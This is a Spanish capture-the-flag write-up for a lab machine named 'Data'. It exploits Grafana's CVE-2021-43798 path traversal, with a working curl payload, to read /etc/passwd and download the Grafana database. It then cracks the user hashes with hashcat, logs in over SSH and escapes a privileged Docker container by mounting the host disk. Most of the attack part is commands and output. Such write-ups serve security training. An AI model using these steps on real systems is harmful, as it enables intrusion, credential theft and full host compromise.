# Resolución maquina Data

**Autor:** PepeMaquina.
**Fecha:** 11 Marzo de 2026.
**Dificultad:** Easy.
**Sistema Operativo:** Linux.
**Tags:** CVE, LFI, Docker.

---
## Imagen de la Máquina

![](data.jpg)

*Imagen: Data.JPG*
## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 4000 -n -Pn 10.129.234.47 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,3000 10.129.234.47 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Grafana
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
Se puede ver un robots.txt, pero esto no contiene algo util.
### Enumeración de la página web
Al ver el contenido de la pagina web se puede observar que se trata de "grafana".
Este pide credenciales validas y tambien muestra una version que es bastante antigua.

![](data1.jpg)

Sin esperar mucho se investigo CVE con esta version desactualizada.
### CVE-2021-43798
Se logro encontrar un CVE que es un path traversal.
Al copiar el exploit obtenido de ExploitDB se tuvo que entender el codigo para saber que comandos colocar, realmente no es muy dificil de replicarlo manualmente pero como ya existe un script para que complicarse. ([Grafana 8.3.0 - Directory Traversal and Arbitrary File Read - Multiple webapps Exploit](https://www.exploit-db.com/exploits/50581))
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits]
└─$ python3 50581.py -H 'http://10.129.234.47:3000'
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
~~~
Esto funciona.
Lo primero que se intento ver, como es una aplicacion web predeterminara, se buscan archivos de configuración que tiene por defecto, una busquea en google y la IA basto.

![](data2.jpg)

Buscando en el archivo que indica se logro ver efectivamente el archivo de configuracion.
~~~bash
Read file > /etc/grafana/grafana.ini
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change

# possible values : production, development
;app_mode = production

# instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty
;instance_name = ${HOSTNAME}

#################################### Paths ####################################
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana
<-----SNIP----->
~~~
Este archivo es realmente largo, pero leyendo detenidamente lo que tiene se logro encontrar o deducir donde se encuentra una base de datos, y que esta es sqlite.
La informacion importante se encuentra en:
~~~bash
[paths]
# Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used)
;data = /var/lib/grafana

<----SNIP---->

#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =

# Use either URL or the previous fields to configure the database
# Example: mysql://user:secret@host:port/database
;url =

# For "postgres" only, either "disable", "require" or "verify-full"
;ssl_mode = disable

# Database drivers may support different transaction isolation levels.
# Currently, only "mysql" driver supports isolation levels.
# If the value is empty - driver's default isolation level is applied.
# For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE".
;isolation_level =

;ca_cert_path =
;client_key_path =
;client_cert_path =
;server_cert_name =

# For "sqlite3" only, path relative to data_path setting
;path = grafana.db

# Max idle conn setting default is 2
;max_idle_conn = 2
<----SNIP---->
~~~
Si se entiende lo visto, esto dice que los archivos de configuracion temporales, bases de datos y demas se encuentran en el directorio `/var/lib/grafana` y la base de datos se llama `grafana.db`.
Uniendo todos esos puntos se encontro la base de datos y leyo el contenido: `/var/lib/grafana/grafana.db`
El contenido de esta base de datos es muy grande, asi que es mas facil si se la descarga, esto directamente con curl.
~~~bash
┌──(kali㉿kali)-[~/htb/data/nmap]
└─$ curl 'http://10.129.234.47:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' -o sqlite
~~~
Alternativamente tambien existen otros exploits en github para descargar los archivos si es les es mas facil (https://gist.github.com/bryanmcnulty/0f013fb75e94140bae70de2b0e986e45).
### Dumpeado DB
Al ver el el contenido de la DB, lo importante parece ser la tabla users.
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits]
└─$ sqlite3 sqlite 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.

sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token           

sqlite> select * from user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0

sqlite> .schema user
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
~~~
A primera vista el hash parece ser estar hasheado con el famoso `PBKDF2`, pero no es del todo seguro, asi que realizando una busqueda en internet sobre que hash tiene grafana, se logro encontrar un repositorio de github que habla sobre descryptor en Grafana (https://github.com/strikoder/Grafana-Password-Decryptor).
Es interesante saber que grafana puede tener dos tipos de hashes y dos formas de desencriptarse, para la tabla `data_source` emplea `AES-256 Base64` y para la tabla `users` efectivamente es `PBKDF2`, este tipo de encriptacion es complicada ya que se debe colocar tanto el hash y salt en base64 para que lo descifre hashcat, ademas saber el numero de iteraciones, pero este repositorio tiene un script que facilita esto.
Primero se coloca los hashes en formato `hash,salt`
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits/Grafana-Password-Decryptor]
└─$ cat grafana_hashes                     
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
~~~
Luego el script lo tranforma.
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits/Grafana-Password-Decryptor]
└─$ python3 grafana2hashcat.py grafana_hashes -o hashcat_hashes.txt 

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  grafana_hashes
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[+] Writing output to 'hashcat_hashes.txt' file.
[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
~~~
Con los hashes convertidos solo es cosa de pasarlo a hashcat y descencriptarlo.
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits/Grafana-Password-Decryptor]
└─$ hashcat -m 10900 hashcat_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat (v7.1.2) starting

<----SNIP---->

sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1

~~~
Se logro encontrar una contraseña.
Como no se tiene claro cual es el usuario ya que al examinar el `/etc/passwd` no se logro encontrar un usuario con bash mas que el root, se prueban los nombres de la base de datos.
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits/Grafana-Password-Decryptor]
└─$ sudo netexec ssh 10.129.234.47 -u users -p pass --continue-on-success
SSH         10.129.234.47   22     10.129.234.47    [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
SSH         10.129.234.47   22     10.129.234.47    [+] boris:beautiful1 (Pwn3d!) Linux - Shell access!
SSH         10.129.234.47   22     10.129.234.47    [-] grafana:beautiful1
~~~
Existe coincidencia, asi que se tiene acceso como `boris`

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`
### User Flag
Ahora si, intentando probar dicha contraseña con ssh, por fin se tiene acceso y se puede leer la user flag.
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits/Grafana-Password-Decryptor]
└─$ ssh boris@10.129.234.47                                              

boris@10.129.234.47's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Wed Mar 11 22:04:50 UTC 2026

  System load:  0.0               Processes:              207
  Usage of /:   38.9% of 4.78GB   Users logged in:        0
  Memory usage: 16%               IP address for eth0:    10.129.234.47
  Swap usage:   0%                IP address for docker0: 172.17.0.1'

boris@data:~$ ls
user.txt
boris@data:~$ cat user.txt 
<Encuentre su propia usre flag>
~~~

---
## Escalada de Privilegios
Para escalar privilegios, se logra ver un permiso sudo de docker.
~~~bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
~~~
Lo mas comun y normal que se realiza con docker exec es entrar al contenedor, pero esto no tiene mucho sentido ya que no sirve de mucho.
### Docker escape
Lo que se podria hacer es de alguna forma se logre compartir la raiz dentro de un directorio del contenedor, pero para esto se necesitan muchos permisos y aparte no se puede crear un contenedor desde 0 sino solo se puede ejecutar comandos dentro de un contenedor ya existente.
No se sabe cual es el nombre o id del contenedor, pero revisando los procesos si se logra encontrar uno.
~~~bash
boris@data:~$ ps -faux | grep docker
root      1028  0.0  4.0 1422756 82340 ?       Ssl  18:55   0:08 dockerd --group docker --exec-root=/run/snap.docker --data-root=/var/snap/docker/common/var-lib-docker --pidfile=/run/snap.docker/docker.pid --config-file=/var/snap/docker/1125/config/daemon.json
root      1245  0.0  2.1 1351312 44344 ?       Ssl  18:56   0:10  \_ containerd --config /run/snap.docker/containerd/containerd.toml --log-level error
root      1553  0.0  0.1 1152456 3308 ?        Sl   18:56   0:00  \_ /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
root      1559  0.0  0.1 1152712 3436 ?        Sl   18:56   0:00  \_ /snap/docker/1125/bin/docker-proxy -proto tcp -host-ip :: -host-port 3000 -container-ip 172.17.0.2 -container-port 3000
boris     4988  0.0  0.0  14860  1100 pts/0    S+   22:39   0:00              \_ grep --color=auto docker
root      1575  0.0  0.4 712608  8936 ?        Sl   18:56   0:03 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
472       1598  0.2  3.2 777028 66428 ?        Ssl  18:56   0:34  \_ grafana-server --homepath=/usr/share/grafana --config=/etc/grafana/grafana.ini --packaging=docker cfg:default.log.mode=console cfg:default.paths.data=/var/lib/grafana cfg:default.paths.logs=/var/log/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins cfg:default.paths.provisioning=/etc/grafana/provisioning
~~~
Se puede ver un id.
El comado docker exec tiene una fucion `--privileged` que permite activar privilegios que ya fueron asignados al crear el contenedor.
Primero ejecutando una shell en el contenedor.
~~~bash
boris@data:~$ sudo /snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
bash-5.1# 
~~~
La unica forma que conozco de montar la raiz del servidor original desde dentro del contenedor es teniendo permisos `cap_sys_admin`, revisando esto veo que no se cuenta con la herramienta `capsh`:
~~~bash
bash-5.1# capsh 
bash: capsh: command not found
~~~
Otra forma de ver capabilities a bajo nivel dentro de procesos de shell es viendo el `/proc/self/status` o `/proc/1/status`.
~~~bash
bash-5.1# cat /proc/1/status
Name:   grafana-server
<----SNIP---->
THP_enabled:    1
Threads:        12
SigQ:   0/7820
SigPnd: 0000000000000000
ShdPnd: 0000000000000000
SigBlk: fffffffc3bfa3a00
SigIgn: 0000000000000000
SigCgt: fffffffc7fc1feff
CapInh: 0000003fffffffff
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
~~~
Lo que se debe ver con cuidado es `CapInh`, `CapPrm`, `CapEff`, `CapBnd`, `CapAmb`, esto presenta datos en hexadecimal, ahora la capabilitie `cap_sys_admin` tiene el bit 21, asi que convirtiendo el hexadecimal con python.
~~~bash
┌──(kali㉿kali)-[~/htb/data/exploits/Grafana-Password-Decryptor]
└─$ python3 - << 'EOF'
import sys
v=int("0000003fffffffff",16)
for i in range(64):
    if v & (1<<i):
        print(i)
EOF
0
1
2
<....SNIP....>
14
15
16
17
18
19
20
21
22
~~~
Se puede ver que exactamente tiene el bit 21, por lo que la capabilitie `cap_sys_admin` esta casi asegurada.
Con este permiso dentro del contenedor, se puede copiar el contenido de la raiz del servidor dentro del contenedor.
Primero viendo las particiones.
~~~bash
bash-5.1$ cat /proc/partitions
major minor  #blocks  name

   7        0     119340 loop0
   7        1      25576 loop1
   7        2      56820 loop2
   7        3      43184 loop3
   8        0    6291456 sda
   8        1    5242880 sda1
   8        2    1047552 sda2
~~~
Y montando la principal al contenedor.
~~~bash
bash-5.1# mount /dev/sda1 /mnt/

bash-5.1# ls -la /mnt/
total 112
drwxr-xr-x   23 root     root          4096 Jun  4  2025 .
drwxr-xr-x    1 root     root          4096 Jan 23  2022 ..
drwxr-xr-x    2 root     root          4096 Apr  9  2025 bin
drwxr-xr-x    3 root     root          4096 Jun  4  2025 boot
drwxr-xr-x    4 root     root          4096 Nov 29  2021 dev
drwxr-xr-x   94 root     root          4096 Jun  4  2025 etc
drwxr-xr-x    3 root     root          4096 Jun  4  2025 home
lrwxrwxrwx    1 root     root            30 Apr  9  2025 initrd.img -> boot/initrd.img-5.4.0-1103-aws
lrwxrwxrwx    1 root     root            30 Jun  4  2025 initrd.img.old -> boot/initrd.img-5.4.0-1103-aws
drwxr-xr-x   19 root     root          4096 Apr 10  2025 lib
drwxr-xr-x    2 root     root          4096 Apr  9  2025 lib64
drwx------    2 root     root         16384 Nov 29  2021 lost+found
drwxr-xr-x    2 root     root          4096 Nov 29  2021 media
drwxr-xr-x    2 root     root          4096 Nov 29  2021 mnt
drwxr-xr-x    2 root     root          4096 Nov 29  2021 opt
drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc
drwx------    7 root     root          4096 Mar 11 18:56 root
drwxr-xr-x    5 root     root          4096 Nov 29  2021 run
drwxr-xr-x    2 root     root         12288 Jun  4  2025 sbin
drwxr-xr-x    7 root     root          4096 Jan 23  2022 snap
drwxr-xr-x    2 root     root          4096 Nov 29  2021 srv
drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys
drwxrwxrwt   11 root     root          4096 Mar 11 23:08 tmp
drwxr-xr-x   10 root     root          4096 Apr  9  2025 usr
drwxr-xr-x   13 root     root          4096 Nov 29  2021 var
lrwxrwxrwx    1 root     root            27 Apr  9  2025 vmlinuz -> boot/vmlinuz-5.4.0-1103-aws
lrwxrwxrwx    1 root     root            27 Jun  4  2025 vmlinuz.old -> boot/vmlinuz-5.4.0-1103-aws
~~~
Se puede ver todo montado dentro del contenedor.

---
## Root Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

Con acceso al directorio raiz del servidor dentro del contenedor, ya se puede leer la root flag y realizar todo lo que se quisiera para lograr persistencia.
~~~bash
bash-5.1# cat /mnt/root/root.txt
<Encuentre su propia root flag>
~~~
De esa forma, se logro obtener la root flag.
🎉 Sistema completamente comprometido - Root obtenido
